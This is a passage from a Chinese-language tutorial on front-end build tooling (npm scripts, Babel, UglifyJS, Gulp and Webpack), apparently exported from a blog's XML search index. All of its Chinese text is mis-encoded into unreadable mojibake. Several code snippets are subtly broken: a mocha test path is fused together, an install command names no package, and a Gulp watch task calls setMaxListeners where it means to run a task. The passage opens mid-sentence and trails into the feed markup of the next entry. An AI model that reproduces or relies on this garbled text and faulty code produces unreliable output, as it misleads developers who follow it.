ä¹‹ç±»çš„å‘½ä»¤ï¼Œåœ¨é¡¹ç›®çš„ package.json æ–‡ä»¶ä¸­ï¼Œæœ‰ä¸ª scripts å±žæ€§ï¼Œå¯ä»¥åœ¨é‚£é‡ŒæŒ‡å®šè‡ªå·±çš„ npm start å‘½ä»¤ï¼š 1234567&#123; ... "scripts":&#123; "start": "node server.js" &#125;, ...&#125; node server.js æ˜¯é»˜è®¤çš„ start å‘½ä»¤ï¼Œè®°å¾—è¦åˆ›å»º server.js æ–‡ä»¶ã€‚æˆ‘ä»¬ä¸€èˆ¬ä¼šå®šä¹‰ test å±žæ€§ï¼Œå› ä¸ºå¯ä»¥æŠŠæµ‹è¯•æ¡†æž¶ä½œä¸ºä¾èµ–é¡¹ï¼Œç„¶åŽç”¨ npm test æ¥è¿è¡Œæµ‹è¯•è„šæœ¬ã€‚ä¾‹å¦‚ï¼Œé€‰æ‹© Mocha æ¥æµ‹è¯•ï¼Œå¹¶ä¸”å®‰è£…ï¼š 1npm i -S -D å¦‚æžœåœ¨ package.json ä¸­æ·»åŠ ä¸‹é¢çš„è¯­å¥ï¼Œå°±ä¸ç”¨å…¨å±€å®‰è£…äº†ï¼š 123456&#123; ... "scripts":&#123; "test":"./node_modules/.bin/mocha_test/*.js" &#125;&#125; ä¸Šä¾‹ä¸­çš„å‚æ•°æ˜¯ä¼ é€’ç»™äº† Mocha,ä¹Ÿå¯ä»¥è¿è¡Œ npm è„šæœ¬æ—¶ç”¨ä¸¤ä¸ªè¿žå­—ç¬¦ä¼ å…¥å‚æ•°ï¼š 1npm test -- test/*.js ä¸‹è¡¨æ˜¯å¸¸ç”¨çš„ npm å‘½ä»¤ï¼š å‘½ä»¤ package.json å±žæ€§ åº”ç”¨æ¡ˆä¾‹ start scripts.start å¯åŠ¨Web åº”ç”¨æœåŠ¡å™¨æˆ– Electron ç¨‹åº stop scripts.stop åœæŽ‰ Web åº”ç”¨æœåŠ¡å™¨ restart è¿è¡Œ stopï¼Œç„¶åŽè¿è¡Œ restart install,postinstall scripts.install,scripts.postinstall åœ¨å®‰è£…äº†åŒ…ä¹‹åŽè¿è¡Œæœ¬åœ°æž„å»ºå‘½ä»¤ï¼Œæ³¨æ„ï¼Œpostinstall åªèƒ½é€šè¿‡ npm run postinstall è¿è¡Œ åˆ›å»ºå®šåˆ¶çš„ npmnpm run å‘½ä»¤ç­‰äºŽ npm run-scriptï¼Œç”¨ npm run script-name å¯ä»¥è¿è¡Œä»»ä½•è„šæœ¬ã€‚ç”¨ Babel æž„å»ºå®¢æˆ·ç«¯è„šæœ¬çš„å‘½ä»¤ï¼š æ–°å»ºé¡¹ç›®ï¼Œç„¶åŽå®‰è£…å¿…è¦çš„ä¾èµ–é¡¹ï¼š 123npm init -ynpm i --S -D babel-cli babel-preset-es2015echo '&#123; "presets": ["es2015"] &#125;' &gt; .babelrc çŽ°åœ¨æœ‰äº†ä¸€ä¸ªå…·æœ‰åŸºæœ¬ Babel ES2015å·¥å…·å’Œæ’ä»¶çš„ Nodeé¡¹ç›®ã€‚æŽ¥ä¸‹æ¥æ‰“package.jsonï¼Œåœ¨ scripts ä¸‹é¢æ·»åŠ  babel å±žæ€§ã€‚å®ƒåº”è¯¥å®‰è£…åˆ°äº† node_modules/.bin æ–‡ä»¶å¤¹ä¸‹çš„è„šæœ¬ï¼š 1"babel": "./node_modules/.bin/babel browser.js -d build/" ä¸‹é¢æ˜¯ ES2015 è¯­æ³•å†™çš„ä»£ç ï¼Œå­˜ä¸º browser.js æ–‡ä»¶ï¼š 12345678class Example &#123; render()&#123; return '&lt;h1&gt;Example&lt;/h1&gt;'; &#125;&#125;const example = new Example();console.log(example.render()); è¿è¡Œ npm run babel ,ä¼šå‡ºçŽ°ä¸€ä¸ª build æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰è½¬ä¹‰çš„ brower.js ï¼Œå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223'use strict';var _createClass = function () &#123; function defineProperties(target, props) &#123; for (var i = 0; i &lt; props.length; i++) &#123; var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); &#125; &#125; return function (Constructor, protoProps, staticProps) &#123; if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; &#125;; &#125;();function _classCallCheck(instance, Constructor) &#123; if (!(instance instanceof Constructor)) &#123; throw new TypeError("Cannot call a class as a function"); &#125; &#125;var Example = function () &#123; function Example() &#123; _classCallCheck(this, Example); &#125; _createClass(Example, [&#123; key: 'render', value: function render() &#123; return '&lt;h1&gt;Example&lt;/h1&gt;'; &#125; &#125;]); return Example;&#125;();var example = new Example();console.log(example.render()); å¦‚æžœæž„å»ºé¡¹ç›®æ—¶ï¼Œåªéœ€è¦åšè¿™ä»¶äº‹ï¼Œé‚£ä¹ˆå¯ä»¥å°†è¿™ä¸ªä»»åŠ¡çš„åç§°æ”¹ä¸º buildï¼Œä½†ä¸€èˆ¬ä¼šåŠ ä¸Š UglifyJS: 1npm i -S-D uglify-es åŒæ ·çš„åœ¨ package.json ä¸­ æ·»åŠ è„šæœ¬æ¥è°ƒç”¨ node_modules/.bin/uglifyJS 1"uglify": "./node_modules/.bin/uglifyjs build/browser.js -o build/browser.min.js" ç„¶åŽï¼Œå¯ä»¥è¿è¡Œ npm run uglify.ä¹Ÿå¯ä»¥ç»„åˆå‘½ä»¤ï¼Œåˆå¹¶åˆ° build å‘½ä»¤ä¸­ 1"build": "npm run babel &amp;&amp; npm run uglify" çŽ°åœ¨ï¼Œè¿è¡Œ npm run build å°±ä¼šæ‰§è¡Œé‚£ä¸¤ä¸ªè„šæœ¬ã€‚Babel æ”¯æŒé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ .babelrc æ–‡ä»¶ä¸­å®žçŽ°æ›´å¤æ‚çš„è¡Œä¸ºã€‚ é…ç½®å‰ç«¯æž„å»ºå·¥å…·ä½¿ç”¨ npm è„šæœ¬æ—¶ï¼Œé€šå¸¸æœ‰ä¸‰ç§é…ç½®å‰ç«¯æž„å»ºå·¥å…·çš„æ–¹æ³•ã€‚ æŒ‡å®šå‘½ä»¤è¡Œå‚æ•°ï¼Œæ¯”å¦‚ ./node_modules/.bin/ uglify â€“source-map ã€‚ é’ˆå¯¹é¡¹ç›®åˆ›å»º é…ç½®æ–‡ä»¶ï¼Œå°†å‚æ•°æ”¾åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼ŒBabelå’Œ ESLint å°†é…ç½®å‚æ•°æ·»åŠ åˆ° package.json ä¸­ã€‚ å¦‚æžœæž„å»ºçš„è¿‡ç¨‹å¤æ‚ï¼Œè¦åšåˆ°æ–‡ä»¶çš„å¤åˆ¶ã€åˆå¹¶å’Œè½¬ç§»ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ª shell è„šæœ¬ï¼Œç„¶åŽç”¨ npm è„šæœ¬è°ƒç”¨å®ƒã€‚å¾ˆå¤šæž„å»ºç³»ç»Ÿéƒ½æä¾›äº† JavaScript API ä»¥å®žçŽ°è‡ªåŠ¨åŒ–æž„å»ºã€‚ ç”¨Gulp å®žçŽ°è‡ªåŠ¨åŒ–Gulp æ˜¯åŸºäºŽæµçš„æž„å»ºç³»ç»Ÿã€‚å¯ä»¥é€šè¿‡å¯¹æµçš„å¼•å¯¼æ¥åˆ›å»ºæž„å»ºè¿‡ç¨‹ï¼Œé™¤äº†è½¬è¯‘å’Œç¼©ç è¿˜å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ã€‚Gulp ä¹‹æ‰€ä»¥èƒ½å®žçŽ°é«˜åº¦é‡ç”¨ï¼Œä¸»è¦å½’åŠŸäºŽä¸¤é¡¹æŠ€æœ¯ï¼šä½¿ç”¨æ’ä»¶å’Œè‡ªå®šä¹‰æž„å»ºä»»åŠ¡ã€‚ æŠŠ Gulp æ·»åŠ åˆ°é¡¹ç›®ä¸­æ·»åŠ Gulpéœ€è¦ç”¨ npm å®‰è£… gulp-cli å’Œ gulp ä¸¤ä¸ªåŒ…ï¼Œå¾ˆå¤šäººä¼šæŠŠ gulp-cli å®‰è£…åœ¨å…¨å±€çŽ¯å¢ƒä¸­ï¼Œè¿™æ ·åªéœ€è¦è¾“å…¥ gulp å°±å¯ä»¥è¿è¡Œ Gulp äº†ã€‚æ–°å»ºæ–‡ä»¶å¤¹ï¼Œå…¨å±€å®‰è£…gulp-cliï¼Œåˆ›å»ºä¸€ä¸ªå¸¦æœ‰Gulp çš„ Node é¡¹ç›®ï¼š 12npm init -ynpm i -S-D gulp åˆ›å»º gulpfile.js. æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œç”¨ Gulp æž„å»ºä¸€ä¸ªå°åž‹çš„ React é¡¹ç›®ï¼Œè¿™é‡Œä¼šç”¨åˆ° gulp-babel/gulp-sourcemaps/gulp-concatï¼š 12npm i -S-D gulp-sourcemaps gulp-babel babel-preset-es2015npm i -S-D gulp-concat react react-dom babel-preset-react å¾€é¡¹ç›®ä¸­æ·»åŠ  Gulp æ’ä»¶æ—¶ï¼ŒæŠŠ npm å‘½ä»¤ä¸­çš„ å‚æ•° â€“save æ¢æˆ â€“save-dev ï¼Œå¦‚æžœä¸ºäº†è¯•éªŒæ–°çš„æ’ä»¶å¹¶æƒ³æŠŠå®ƒä»¬å¸æŽ‰ï¼Œå¯ä»¥ä½¿ç”¨ npm uninstall â€“save-dev ï¼ŒæŠŠå®ƒä»¬ä»Ž ./node_modules é‡Œåˆ æŽ‰ï¼ŒåŒæ—¶æ›´æ–° package.json æ–‡ä»¶ã€‚ Gulp ä»»åŠ¡çš„åˆ›å»ºä»¥åŠè¿è¡Œåˆ›å»º Gulp ä»»åŠ¡éœ€è¦åœ¨ gulpfile.js ä¸­ç¼–å†™ Node ä»£ç ï¼Œè°ƒç”¨ Gulp çš„ API .Gulp çš„ API å¯ä»¥åšå¾ˆå¤šäº‹ï¼Œæ¯”å¦‚æŸ¥æ‰¾æ–‡ä»¶ï¼ŒæŠŠå¯¹æ–‡ä»¶è¿›è¡ŒæŸç§è½¬æ¢çš„æ’ä»¶æ‹¼åˆ°ä¸€èµ·ç­‰ã€‚ ä¸‹é¢çš„ä¾‹å­ï¼Œæ‰“å¼€ gulpfile.js æž„å»ºä¸€ä¸ªä»»åŠ¡ï¼Œç”¨ gulp.src æŸ¥æ‰¾ JSX æ–‡ä»¶ï¼Œç”¨Babel å¤„ç† ES2015 å’Œ React ,ç„¶åŽæŠŠæ–‡ä»¶æ‹¼åœ¨ä¸€èµ·ã€‚ 12345678910111213141516171819const gulp = require('gulp');const sourcemaps = require('gulp-sourcemaps');const babel = require('gulp-babel');const concat = require('gulp-concat');gulp.task('default',()=&gt;&#123; return gulp.src('app/*.jsx') // å¼€å§‹ç›‘æµ‹æºæ–‡ä»¶ï¼Œä¸ºè°ƒç”¨æž„å»ºæºç æ˜ å°„ .pipe(sourcemaps.init()) // ä½¿ç”¨ ES2015 å’Œ React(JSX) é…ç½® gulp-babel .pipe(babel(&#123; presets:['es2015','react'] &#125;)) .pipe(concat('all.js')) // å•ç‹¬å†™å…¥æºç æ˜ å°„æ–‡ä»¶ .pipe(sourcemaps.write('.')) // å°†æ‰€æœ‰æ–‡ä»¶æ”¾åˆ°dist/ç›®å½•ä¸‹ .pipe(gulp.dest('dist'));&#125;); åœ¨ç»ˆç«¯è¿è¡Œ gulp å°±å¯ä»¥è¿è¡Œè¿™ä¸ªä»»åŠ¡ã€‚åˆ›å»ºä¸€ä¸ª app/index.jsx æ–‡ä»¶è¿›è¡Œè¯•éªŒï¼š 123456import React from 'react';import ReactDOM from 'react-dom';ReactDOM.render( &lt;h1&gt;Hello,World!&lt;/h1&gt;, document.getElementById('example')); åœ¨ Gulpä¸­ï¼Œç”¨ JavaScriptè¡¨ç¤ºæž„å»ºé˜¶æ®µå¾ˆå®¹æ˜“ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥ç”¨ gulp.task() å¾€è¿™ä¸ªæ–‡ä»¶é‡Œæ·»åŠ è‡ªå·±çš„ä»»åŠ¡ã€‚è¿™äº›ä»»åŠ¡é€šå¸¸éƒ½éµå¾ªç›¸åŒçš„æ¨¡å¼ã€‚ (1) æºæ–‡ä»¶â€”â€”æ”¶é›†è¾“å…¥æ–‡ä»¶ã€‚(2) è½¬è¯‘â€”â€”è®©å®ƒä»¬ä¾æ¬¡é€šè¿‡ä¸€ä¸ªä¸ªå¯¹å®ƒä»¬è¿›è¡Œè½¬æ¢çš„æ’ä»¶ã€‚(3) åˆå¹¶â€”â€”æŠŠè¿™äº›æ–‡ä»¶åˆåˆ°ä¸€èµ·ï¼Œåˆ›å»ºä¸€ä¸ªæ•´ä½“æž„å»ºæ–‡ä»¶ã€‚(4) è¾“å‡ºâ€”â€”è®¾å®šæ–‡ä»¶çš„ç›®æ ‡åœ°å€æˆ–ç§»åŠ¨è¾“å‡ºæ–‡ä»¶ã€‚ åœ¨å‰é¢é‚£ä¸ªä¾‹å­ä¸­ï¼Œ sourcemaps æ˜¯ä¸ªç‰¹ä¾‹ï¼Œå› ä¸ºå®ƒéœ€è¦ä¸¤æ¬¡ pipe ï¼šç¬¬ä¸€æ¬¡æ˜¯é…ç½®ï¼Œæœ€åŽä¸€æ¬¡æ˜¯è¾“å‡ºæ–‡ä»¶ã€‚è¿™æ˜¯å› ä¸ºæºç æ˜ å°„éœ€è¦æŠŠæœ€åˆçš„ä»£ç è¡Œæ•°æ˜ å°„åˆ°åº”è¯¥è½¬è¯‘æž„å»ºåŽçš„ä»£ç è¡Œæ•°ä¸Šã€‚ ç›‘æµ‹å˜åŒ– ç²¾ç®€æž„å»ºè¿‡ç¨‹æœ€ç®€å•çš„åŠžæ³•å°±æ˜¯ç”¨ Gulp æ’ä»¶ç›‘æµ‹æ–‡ä»¶ç³»ç»Ÿçš„å˜åŒ–ï¼Œä½†ä¹Ÿæœ‰å¤‡é€‰æ–¹æ¡ˆã€‚æœ‰äº›åº“è·Ÿçƒ­é‡è½½é…åˆå¾ˆå¥½ï¼Œå¹¶ä¸”é€šç”¨çš„DOM å’ŒåŸºäºŽ CSS çš„é¡¹ç›®ä¹Ÿä¼šå¾ˆé€‚åˆ LiveReload é¡¹ç›®ã€‚ ä½œä¸ºå®žä¾‹ï¼Œå¯ä»¥å°† gulp-watch æ·»åŠ åˆ°é¡¹ç›®ä¸­ï¼š 1npm i -S-D gulp-watch æ·»åŠ æ£€æµ‹ä»»åŠ¡ï¼Œè®©å®ƒè°ƒç”¨å‰é¢çš„é‚£ä¸ªä¾‹å­ä¸­çš„é»˜è®¤ä»»åŠ¡ï¼š 1234const watch = require('gulp-watch');gulp.task('watch',()=&gt;&#123; watch('app/**.js',() =&gt; gulp.setMaxListeners('default'));&#125;); è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸º watch çš„ä»»åŠ¡ï¼Œç„¶åŽç”¨ watch() ç›‘æµ‹ React JSX æ–‡ä»¶çš„å˜åŒ–ã€‚åªè¦æœ‰æ–‡ä»¶å‘ç”Ÿäº†å˜åŒ–ï¼Œé»˜è®¤çš„æž„å»ºä»»åŠ¡å°±ä¼šè¿è¡Œã€‚åªéœ€ç¨ç¨ä¿®æ”¹ï¼Œè¿™ä¸ªå¤„æ–¹å°±å¯ä»¥ç”¨æ¥æž„å»ºSASSæ–‡ä»¶ã€ä¼˜åŒ–å›¾ç‰‡ï¼Œä»¥åŠåšéœ€è¦åœ¨å‰ç«¯é¡¹ç›®ä¸Šåšçš„å¾ˆå¤šäº‹æƒ…ã€‚ åœ¨å¤§é¡¹ç›®ä¸­æŠŠä»»åŠ¡åˆ†æ•£åˆ°ä¸åŒæ–‡ä»¶ä¸­é¡¹ç›®è§„æ¨¡å˜å¤§åŽï¼Œä¸€èˆ¬ä¼šéœ€è¦æ›´å¤šçš„ Gulp ä»»åŠ¡ã€‚æœ€ç»ˆä¼šå‡ºçŽ°ä¸€ä¸ªå¤§åˆ°éš¾ä»¥ç†è§£çš„é•¿æ–‡ä»¶ï¼Œå¦‚æžœæŠŠä»£ç åˆ†è§£æˆä¸åŒçš„æ¨¡å—ï¼Œå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ä½ å·²ç»çœ‹åˆ°äº†ï¼ŒGulpæ˜¯ç”¨ Nodeçš„æ¨¡å—ç³»ç»Ÿæ¥åŠ è½½æ’ä»¶çš„ã€‚æ²¡æœ‰ç‰¹æ®Šçš„æ’ä»¶åŠ è½½ç³»ç»Ÿï¼Œå°±æ˜¯æ ‡å‡†æ¨¡å—ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ Node çš„æ¨¡å—ç³»ç»Ÿåˆ†å‰²è¶…é•¿çš„ gulpfile æ–‡ä»¶ï¼Œä»¥ä¾¿äºŽç»´æŠ¤ã€‚å¯ä»¥æŒ‰å¦‚ä¸‹æ­¥éª¤æ¥ä½¿ç”¨åˆ†æ•£çš„æ–‡ä»¶ã€‚ (1) åˆ›å»ºä¸€ä¸ªåä¸º gulpçš„æ–‡ä»¶å¤¹ä»¥åŠä¸€ä¸ªåä¸º tasksçš„å­ç›®å½•ã€‚(2) åœ¨å„ä¸ªæ–‡ä»¶ä¸­ç”¨ gulp.task() è¯­æ³•å®šä¹‰ä»»åŠ¡ï¼Œæœ€å¥½æ˜¯æ¯ä¸ªä»»åŠ¡æ”¾ä¸€ä¸ªæ–‡ä»¶ã€‚(3) åˆ›å»ºä¸€ä¸ªåä¸º gulp/index.jsçš„æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åŠ è½½æ‰€æœ‰çš„ Gulpä»»åŠ¡æ–‡ä»¶ã€‚(4) åœ¨ gulpfile.jsä¸­å¼•å…¥è¿™ä¸ª gulp/index.jsæ–‡ä»¶ã€‚ Gulp æ˜¯ä¸€ä¸ªé€šç”¨çš„é¡¹ç›®è‡ªåŠ¨åŒ–å·¥å…·ã€‚å®ƒé€‚åˆç®¡ç†é¡¹ç›®é‡Œçš„è·¨å¹³å°æ¸…ç†è„šæœ¬ï¼Œæ¯”å¦‚è¿è¡Œå¤æ‚çš„å®¢æˆ·ç«¯æµ‹è¯•æˆ–è€…ä¸ºæ•°æ®åº“æä¾›å›ºå®šçš„æµ‹è¯•çŽ¯å¢ƒã€‚å°½ç®¡å®ƒä¹Ÿå¯ä»¥æž„å»ºå®¢æˆ·ç«¯èµ„äº§ï¼Œä½†ä¸å¦‚ä¸“é—¨åšè¿™äº›äº‹æƒ…çš„å·¥å…·ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸è¾ƒä¹‹ä¸‹ï¼ŒGulp éœ€è¦æ›´å¤šçš„ä»£ç å’Œé…ç½®æ¥å®šä¹‰é‚£äº›ä»»åŠ¡ã€‚Webpackå°±æ˜¯è¿™æ ·çš„å·¥å…·ï¼Œä¸“æ³¨äºŽæ‰“åŒ… JavaScriptå’Œ CSSæ¨¡å—ã€‚ ç”¨ Webpack æž„å»º Web ç¨‹åºWebpackæ˜¯ä¸“é—¨ç”¨æ¥æž„å»º Webç¨‹åºçš„ã€‚ç”¨ Gulpæ—¶ï¼Œå†™ JavaScript ä»£ç æ˜¯ä¸ºäº†é©±åŠ¨æž„å»ºç³»ç»Ÿï¼Œæ‰€ä»¥ä¼šæ¶‰åŠå†™ gulpfile å’Œæž„å»ºä»»åŠ¡ã€‚è€Œç”¨ Webpackæ—¶ï¼Œå†™çš„æ˜¯é…ç½®æ–‡ä»¶ï¼Œç”¨æ’ä»¶å’ŒåŠ è½½å™¨æ·»åŠ æ–°åŠŸèƒ½ã€‚æœ‰æ—¶å€™ä¸éœ€è¦é¢å¤–çš„é…ç½®ï¼šåœ¨å‘½ä»¤è¡Œé‡Œè¾“å…¥webpack ï¼Œå°†æºæ–‡ä»¶çš„è·¯å¾„ä½œä¸ºå‚æ•°ï¼Œå®ƒå°±èƒ½æž„å»ºé¡¹ç›®ã€‚ Webpackçš„ä¼˜åŠ¿ä¹‹ä¸€æ˜¯æ›´å®¹æ˜“å¿«é€Ÿæ­å»ºå‡ºä¸€ä¸ªæ”¯æŒå¢žé‡å¼æž„å»ºçš„æž„å»ºç³»ç»Ÿã€‚å¦‚æžœé…ç½®æˆæ–‡ä»¶å‘ç”Ÿå˜åŒ–æ—¶è‡ªåŠ¨æž„å»ºï¼ŒWebpackä¸ä¼šå› ä¸ºä¸€ä¸ªæ–‡ä»¶å‘ç”Ÿå˜åŒ–è€Œé‡æ–°æž„å»ºæ•´ä¸ªé¡¹ç›®ã€‚æ‰€ä»¥å®ƒçš„æž„å»ºæ›´å¿«ï¼Œä¹Ÿæ›´å¥½ç†è§£ã€‚ ä½¿ç”¨æ‰“åŒ…å™¨å’Œæ’ä»¶Webpackæ’ä»¶æ˜¯ç”¨æ¥æ”¹å˜æž„å»ºè¿‡ç¨‹çš„è¡Œä¸ºçš„ã€‚è¿™äº›è¡Œä¸ºåŒ…æ‹¬è‡ªåŠ¨å°†é™æ€èµ„æºä¸Šä¼ åˆ°Amazon S3æˆ–åŽ»æŽ‰è¾“å‡ºä¸­é‡å¤çš„æ–‡ä»¶ç­‰ã€‚ åŠ è½½å™¨æ˜¯ç”¨æ¥è½¬æ¢èµ„æºæ–‡ä»¶çš„ã€‚æ¯”å¦‚å°† SASS è½¬æ¢ä¸º CSSï¼Œæˆ–è€…å°† ES2015 è½¬æ¢ä¸º ES5ã€‚åŠ è½½å™¨æ˜¯å‡½æ•°ï¼Œè´Ÿè´£å°†è¾“å…¥çš„æºæ–‡æœ¬è½¬æ¢ä¸ºç‰¹å®šçš„æ–‡æœ¬è¾“å‡ºã€‚å®ƒä»¬æ—¢å¯ä»¥æ˜¯å¼‚æ­¥çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒæ­¥çš„ã€‚æ’ä»¶æ˜¯å¯ä»¥æŒ‚æŽ¥åˆ° Webpackæ›´åº•å±‚ APIçš„ç±»çš„å®žä¾‹ã€‚ å¦‚æžœéœ€è¦è½¬æ¢ React ä»£ç ã€CoffeeScriptã€SASS æˆ–å…¶ä»–è½¬è¯‘è¯­è¨€ï¼Œå°±ç”¨åŠ è½½å™¨ã€‚å¦‚æžœéœ€è¦è°ƒæ•´ JavaScriptï¼Œæˆ–ç”¨æŸç§æ–¹å¼å¤„ç†æ–‡ä»¶ï¼Œå°±ç”¨æ’ä»¶ã€‚ é…ç½®å’Œè¿è¡Œ Webpackæ–°å»ºæ–‡ä»¶å¤¹ 1234npm init -ynpm install --save react react-domnpm install --save-dev webpack babel-loader babel-corenpm install --save-dev babel-preset-es2015 babel-preset-react æœ€åŽä¸€æ¡å‘½ä»¤å®‰è£…äº† Babel çš„ ES2015 æ’ä»¶å’Œç”¨äºŽ Babel çš„ React è½¬æ¢å™¨,åˆ›å»ºwebpack.config.js.æˆ‘ä»¬è¦åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œå‘Šè¯‰ Webpack åŽ»å“ªé‡Œæ‰¾è¾“å…¥æ–‡ä»¶ï¼ŒæŠŠè¾“å‡ºå†™åˆ°å“ªé‡Œï¼Œä»¥åŠç”¨å“ªäº›åŠ è½½å™¨ã€‚æˆ‘ä»¬è¦å¯¹ Reactä½¿ç”¨ babel-loaderï¼Œè¿˜è¦å¯¹å®ƒåšäº›é¢å¤–çš„é…ç½®ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819const path = require('path');const webpack = require('webpack');module.exports = &#123; entry: './app/index.jsx', output: &#123; path: __dirname, filename: 'dist/bundle.js' &#125;, module: &#123; loaders: [ &#123; test: /.jsx?$/, loader: 'babel-loader', exclude: /node_modules/, query: &#123; presets: ['es2015', 'react'] &#125; &#125; ] &#125;&#125; è¿™ä¸ªé…ç½®æ–‡ä»¶åŒ…å«äº†æˆåŠŸæž„å»ºä¸€ä¸ªä»¥ ES2015 å†™çš„ React ç¨‹åºæ‰€éœ€çš„ä¸€åˆ‡ã€‚é‡Œé¢çš„é…ç½®éƒ½å¾ˆç›´ç™½ï¼šå®šä¹‰ä¸€ä¸ª entry ï¼ŒåŒæ—¶åŠ è½½ç¨‹åºçš„ä¸»æ–‡ä»¶ã€‚ç„¶åŽæŒ‡å®šè¾“å‡ºåº”è¯¥å†™åˆ°å“ªé‡Œã€‚å¦‚æžœè¿™ä¸ªæ–‡ä»¶ä¸å­˜åœ¨ï¼ŒWebpackä¼šåˆ›å»ºå®ƒã€‚æŽ¥ç€å®šä¹‰ä¸€ä¸ªåŠ è½½å™¨ï¼Œå¹¶ç”¨ test æŠŠå®ƒå…³è”åˆ°ä¸€ä¸ªæ–‡ä»¶èšé›†æœç´¢ä¸Šã€‚æœ€åŽï¼Œè®¾å®šåŠ è½½å™¨çš„é€‰é¡¹ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¿™äº›é€‰é¡¹åŠ è½½äº† ES2015å’Œ React Babelæ’ä»¶ã€‚ ç”¨ Webpack å¼€å‘æœåŠ¡å™¨Express æœåŠ¡å™¨ä¼šåœ¨æ–‡ä»¶å‘ç”Ÿå˜åŒ–åŽè¿è¡Œ Webpackï¼Œç„¶åŽå°†å˜åŒ–åŽçš„èµ„æºæ–‡ä»¶æä¾›ç»™æµè§ˆå™¨ã€‚ä¸ºäº†ä¸è·Ÿä¸»æœåŠ¡å™¨å†²çªï¼Œä½ åº”è¯¥æŠŠå®ƒè·‘åœ¨å¦å¤–ä¸€ä¸ªç«¯å£ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œ script æ ‡ç­¾è¦æŒ‡å‘è¿™ä¸ªå¼€å‘æœåŠ¡å™¨æä¾›çš„ URL ä¸Šã€‚è¿™ä¸ªæœåŠ¡å™¨ä¼šæž„å»ºèµ„æºæ–‡ä»¶ï¼Œä½†è¾“å‡ºä¼šæ”¾åœ¨å†…å­˜é‡Œï¼Œè€Œä¸æ˜¯ Webpack çš„è¾“å‡ºæ–‡ä»¶å¤¹é‡Œã€‚webpack-dev-server ä¹Ÿå¯ä»¥ç”¨æ¥åšæ¨¡å—çƒ­åŠ è½½ï¼Œè¿™ä¸Ž LiveReloadæœåŠ¡å™¨çš„ç”¨æ³•ç±»ä¼¼ã€‚ æŒ‰ä¸‹é¢çš„æ­¥éª¤æŠŠ webpack-dev-serveræ·»åŠ åˆ°é¡¹ç›®ä¸­ã€‚ (1) ç”¨ npm i â€“save-dev webpack-dev-server@ 1.14.1 å®‰è£… webpack-dev-serverã€‚(2) åœ¨ webpack.config.jsçš„ output å±žæ€§ä¸­æ·»åŠ ä¸€ä¸ª publicPath é€‰é¡¹ã€‚(3) åœ¨æž„å»ºç›®å½•ä¸‹æ·»åŠ  index.htmlæ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­åŠ è½½æ‰“åŒ…åŽçš„ JavaScriptå’Œ CSSæ–‡ä»¶ï¼Œæ³¨æ„ URLä¸­çš„ç«¯å£æ˜¯ä¸‹ä¸€æ­¥ä¸­æŒ‡å®šçš„é‚£ä¸ªç«¯å£ã€‚(4) å¸¦ç€ä½ æƒ³è¦ç”¨çš„é€‰é¡¹è¿è¡ŒæœåŠ¡å™¨ã€‚æ¯”å¦‚ webpack-dev-server â€“hot â€“inlineâ€“content-base dist/ â€“port 3001 ã€‚(5) è®¿é—® http://localhost:3001/ åŠ è½½è¿™ä¸ªç¨‹åºã€‚ Webpack å…·ä½“çš„å¯ä»¥è‡ªè¡Œç™¾åº¦ æ€»ç»“ npmè„šæœ¬æ˜¯å®žçŽ°ç®€å•ä»»åŠ¡è‡ªåŠ¨åŒ–å’Œè„šæœ¬è°ƒç”¨çš„æœ€ä½³é€‰æ‹©ã€‚ Gulpå¯ä»¥ç”¨ JavaScriptç¼–å†™æ›´åŠ å¤æ‚çš„ä»»åŠ¡ï¼Œå¹¶ä¸”å®ƒæ˜¯è·¨å¹³å°çš„ã€‚ å¦‚æžœ gulpfileså˜å¾—å¤ªé•¿äº†ï¼Œå¯ä»¥æŠŠä»£ç åˆ†è§£åˆ°å¤šä¸ªæ–‡ä»¶ä¸­ã€‚ Webpackå¯ä»¥ç”¨æ¥ç”Ÿæˆå®¢æˆ·ç«¯æ‰“åŒ…æ–‡ä»¶ã€‚ å¦‚æžœåªéœ€è¦æž„å»ºå®¢æˆ·ç«¯æ‰“åŒ…æ–‡ä»¶ï¼Œç”¨ Webpackå¯èƒ½æ¯”ç”¨ Gulpæ›´çœäº‹å„¿ã€‚ Webpackæ”¯æŒçƒ­é‡è½½ï¼Œä¹Ÿå°±æ˜¯è¯´åˆ·æ–°æµè§ˆå™¨å°±èƒ½çœ‹å‡ºä»£ç çš„å˜åŒ–ã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” Node Web ç¨‹åºæ˜¯ä»€ä¹ˆ]]></title>
    <url>%2F2018-12-05-NodeJs2-Part3.html</url>
